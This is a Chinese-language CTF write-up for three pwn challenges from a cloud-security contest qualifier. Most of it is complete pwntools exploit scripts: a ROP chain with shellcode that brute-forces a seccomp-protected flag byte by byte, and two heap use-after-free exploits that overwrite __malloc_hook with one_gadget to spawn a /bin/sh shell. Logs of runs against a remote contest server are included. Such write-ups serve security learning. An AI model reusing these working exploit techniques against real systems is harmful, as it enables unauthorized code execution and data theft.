“数字经济”云安全共测大赛初赛 

最后几分钟被人超了，唉

# dark

环境是`ubuntu18.04`,`libc2.27`

栈溢出，然后有`seccomp`，用`seccomp-tools` 来`dump`一下

```shell
ruan@ubuntu:/mnt/hgfs/shared/gcctf/pwn/dark$ seccomp-tools  dump ./dark
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008
 0007: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
ruan@ubuntu:/mnt/hgfs/shared/gcctf/pwn/dark$ 
```

只能用`open`,`read`和`mprotect`

思路就是一位一位的比较就好了

我的思路是先把`flag`读到`bss`段上，然后`cmp`，成功的话就在调用2次`read`，失败就直接挂掉，于是我们只要能在`read`两次就说明猜对了，不能的话就是没猜对，然后就1字节1字节的爆破

收发有毒，本地通了，远程没通，调了好久，心力憔悴

最终exp为:

(脚本写的不是很好，所以是手动一位一位的来，唉

```python

from pwn import *

context.arch = "amd64"

def main(host,value,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./dark")
		# debug(0x0000000000000EC7)
		gdb.attach(p,"b *0x00000000040121E")
	try:
		# 0x000000000040127b : pop rdi ; ret
		# 0x0000000000401279 : pop rsi ; pop r15 ; ret
		# .text:0000000000401272                 pop     rbx
		# .text:0000000000401273                 pop     rbp
		# .text:0000000000401274                 pop     r12
		# .text:0000000000401276                 pop     r13
		# .text:0000000000401278                 pop     r14
		# .text:000000000040127A                 pop     r15
		# .text:000000000040127C                 retn
		p_rdi = 0x000000000040127b
		p_rsir = 0x0000000000401279
		pppppp_r = 0x000000000401272
		call_r12 = 0x000000000401258
		bss = 0x000000000404050
		payload = "A"*0x18+p64(pppppp_r)+p64(0)+p64(1)+p64(elf.got["read"])
		payload += p64(0)+p64(elf.got["alarm"])+p64(1)+p64(call_r12)
		payload += p64(0)	#add rsp,8
		payload += p64(0)+p64(1)+p64(elf.got["read"])
		payload += p64(0)+p64(bss+0x100)+p64(0x208)+p64(call_r12)
		payload += p64(0)	#add rsp,8
		payload += p64(0)+p64(1)+p64(elf.got["read"])
		payload += p64(0)+p64(bss+0x100)+p64(0xa)+p64(call_r12)
		payload += p64(0)	#add rsp,8
		payload += p64(0)+p64(1)+p64(elf.got["alarm"])
		payload += p64(bss-0x50)+p64(0x1000)+p64(0x7)+p64(call_r12)
		payload += p64(0)	#add rsp,8
		payload += p64(bss+0x110)*9
		payload = payload.ljust(0x200,"\x00")
		# payloads = payload + "\x45"
		p.send(payload)
		sleep(0.3)
		p.send("\x45")
		
	
		shellcode = asm('''
			/* open(flag,0) */
			inc rax
			inc rax
			push 0x404350
			pop rdi
			xor rsi,rsi
			syscall
			/* read(fd,buf,0x100) */
			push rax
			pop rdi
			xor rax,rax
			push 0x404450
			pop rsi
			push 0x100
			pop rdx
			syscall
			xor rbx,rbx
			mov bl,byte ptr[0x404472]
		''')
		#cmp bl,value
		shellcode += "\x80\xfb"+value
		shellcode += asm('''
			je success
			/* fail */
			xor rax,rax
			mov qword ptr[rax],0
		success:
			xor rax,rax
			push 0x404350
			pop rsi
			xor rdi,rdi
			push 0x100
			pop rdx
			syscall
			xor rax,rax
			push 0x404350
			pop rsi
			xor rdi,rdi
			push 0x100
			pop rdx
			syscall	
		''')
		payload = "\x90"*0x20+shellcode
		payload = payload.ljust(0x200)
		# payloads += payload+"/flag"+"\x00"*3+"\x90"*0xa
		p.send(payload+"/flag"+"\x00"*3)
		p.send("\x90"*0xa)
		# p.send(payloads)
		
		p.send("A"*0x100)
		sleep(1)
		p.send("A"*0x100)
		success(value)
		pause()
		p.close()
		exit()
	except:	
		p.close()
	
if __name__ == "__main__":
	# libc = ELF("./libc-2.27.so",checksec=False)
	elf = ELF("./dark",checksec=False)
	# main(args['REMOTE'],'{')
	for i in range(0x30,0x3a):
		main(args['REMOTE'],chr(i))
	for i in range(ord('a'),ord('a')+7):
		main(args['REMOTE'],chr(i))
	#ctf{d9a6d413a52445aedef7ce7b88f3c4f3}

```
爆破的情况:

```shell
ruan@ubuntu:/mnt/hgfs/shared/gcctf/pwn/dark$ python slove.py  REMOTE=121.41.41.111
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[+] b
[*] Paused (press any to continue)

[19]+  Stopped                 python slove.py REMOTE=121.41.41.111
ruan@ubuntu:/mnt/hgfs/shared/gcctf/pwn/dark$ python slove.py  REMOTE=121.41.41.111
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[+] 8
[*] Paused (press any to continue)

[20]+  Stopped                 python slove.py REMOTE=121.41.41.111
ruan@ubuntu:/mnt/hgfs/shared/gcctf/pwn/dark$ python slove.py  REMOTE=121.41.41.111
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[*] Closed connection to 121.41.41.111 port 9999
[+] Opening connection to 121.41.41.111 on port 9999: Done
[+] 3
[*] Paused (press any to continue)
```

# amazon

环境是`ubuntu18.04`,`libc2.27`

漏洞是`UAF`，然后是可以用`scanf`来申请一个大堆块（要先把`tcache`填满），绕过题目从`chunk+0x20`处开始读的限制,然后就是用`__realloc_hook`和`__malloc_hook`来调整栈的布局使得`onegadget`成功

```python
from pwn import *

context.arch="amd64"

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice: ")
	p.sendline(str(command))

def buy(item,many,sz,content):
	cmd(1)
	p.recvuntil("buy: ")
	p.sendline(str(item))
	p.recvuntil("How many: ")
	p.sendline(str(many))
	p.recvuntil("your note: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
		
def	show():
	cmd(2)
	
def checkout(idx):
	cmd(3)
	p.recvuntil("going to pay for:")
	p.sendline(str(idx))
def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./amazon")
		# debug(0x00000000000128D)
		gdb.attach(p)
	for i in range(0x17):
		buy(1,1,0x40,"A"*8)
	for i in range(0x17):
		checkout(i)
	for i in range(0x7):
		buy(1,1,0x40,"A"*8)
	buy(1,1,0x40,"A"*8)	
	cmd(3)
	# gdb.attach(p)
	p.recvuntil("going to pay for:")
	p.sendline("1"*0x1000)
	buy(1,1,0x50,"A")
	show()
	for i in range(9):
		p.recvuntil("A"*8)
	p.recvuntil("Name: ")
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3ebca0
	success('libc : '+hex(libc.address))
	
	for i in range(0x7):
		buy(1,1,0x40,"A"*8)
	checkout(13)
	buy(1,1,0x100,"A")
	buy(1,1,0x100,"\x00"*0xc0+p64(0)+p64(0xe1)+p64(libc.symbols["__malloc_hook"]-0x30))
	buy(1,1,0xa8,"/bin/sh\x00")
	# 0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# rcx == NULL

	# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL
	
	# 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL

	buy(1,1,0xa8,p64(0)+p64(libc.address+0x4f322)+p64(libc.symbols["realloc"]+4))
	cmd(1)
	p.recvuntil("buy: ")
	p.sendline(str(0))
	p.recvuntil("How many: ")
	p.sendline(str(0))
	p.recvuntil("your note: ")
	p.sendline(str(0))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so",checksec=False)
	# elf = ELF("./note_three",checksec=False)
	main(args['REMOTE'])
```

# fkroman

环境是`ubuntu16.04`,`libc2.23`

这题也是`UAF`,没有`show`函数，老套路了

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))

def add(idx,sz):
	cmd(1)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	
def dele(idx):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
		
def edit(idx,sz,content):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./fkroman")
		# debug(0x0000000000000EC7)
		gdb.attach(p)
	add(0,0x400)
	add(1,0x60)
	add(2,0x60)
	add(3,0x60)
	dele(0)
	# t = int(raw_input("guess: "))
	t = 0x7
	stdout = (t << 12) | 0x620
	add(4,0x60)
	add(5,0x60)
	add(6,0x60)
	add(7,0x60)
	dele(5)
	dele(6)
	edit(6,1,"\x00")
	edit(4,2,p16(stdout-0x43))
	add(8,0x60)
	add(9,0x60)
	add(10,0x60)
	payload = "\x00"*0x33+p64(0xfbad1800)+p64(0)*3+"\x00"
	edit(10,len(payload),payload)
	p.recv(0x40)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3c5600
	success('libc : '+hex(libc.address))
	
	dele(5)
	edit(5,8,p64(libc.symbols["__malloc_hook"]-0x23))
	# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# [rsp+0x30] == NULL

	# 0xf02a4	execve("/bin/sh", rsp+0x50, environ)
	# constraints:
	# [rsp+0x50] == NULL

	# 0xf1147	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL
	add(11,0x60)
	add(12,0x60)
	one_gadget = libc.address+0x4526a
	info("one_gadget : " + hex(one_gadget))
	payload = "\x00"*0x13+p64(one_gadget)
	edit(12,len(payload),payload)
	add(0,0)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.23.so",checksec=False)
	# elf = ELF("./note_three",checksec=False)
	main(args['REMOTE'])
```